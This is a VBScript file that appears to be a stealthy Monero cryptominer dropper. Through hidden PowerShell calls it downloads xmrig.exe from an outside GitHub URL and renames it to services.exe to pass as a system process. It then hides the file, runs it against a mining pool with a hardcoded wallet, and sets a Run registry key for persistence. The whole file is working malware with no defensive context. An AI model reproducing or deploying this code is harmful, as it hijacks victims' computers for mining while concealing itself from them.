
Option Explicit
Dim wsh, fso, minerFolder, minerName, wallet, pool, downloadUrl, psCommand

Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

wallet = "48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rRZd7vVXjRTnWEBBE33BC2sdw9k"
pool = "gulf.moneroocean.stream:10128"
downloadUrl = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/xmrig.exe"

minerFolder = wsh.SpecialFolders("AppData") & "\miner"
minerName = "services.exe" ' Renaming to services.exe helps hide the process

' 1. Create folder (Fast, so we keep this simple)
If Not fso.FolderExists(minerFolder) Then
 wsh.Run "cmd /c mkdir " & Chr(34) & minerFolder & Chr(34), 0, True
End If

' 2. DOWNLOAD (Hidden)
' Uses PowerShell to download invisibly
psCommand = "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & minerFolder & "\xmrig.exe'"
wsh.Run psCommand, 0, True
WScript.Sleep 3000 ' Wait for download to complete

' 3. RENAME (Hidden)
' Uses PowerShell to rename invisibly
psCommand = "powershell -WindowStyle Hidden -Command Rename-Item '" & minerFolder & "\xmrig.exe' '" & minerName & "'"
wsh.Run psCommand, 0, True
WScript.Sleep 1000 ' Wait for rename to complete

' 4. MAKE FILE HIDDEN
fso.GetFile(minerFolder & "\" & minerName).Attributes = 2

' 5. RUN MINER (Hidden)
wsh.Run """" & minerFolder & "\" & minerName & """ -o " & pool & " -u " & wallet & " --cpu-priority 1 --threads=2", 0, False

' 6. PERSISTENCE
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NoMaskMiner", wsh.ScriptFullName
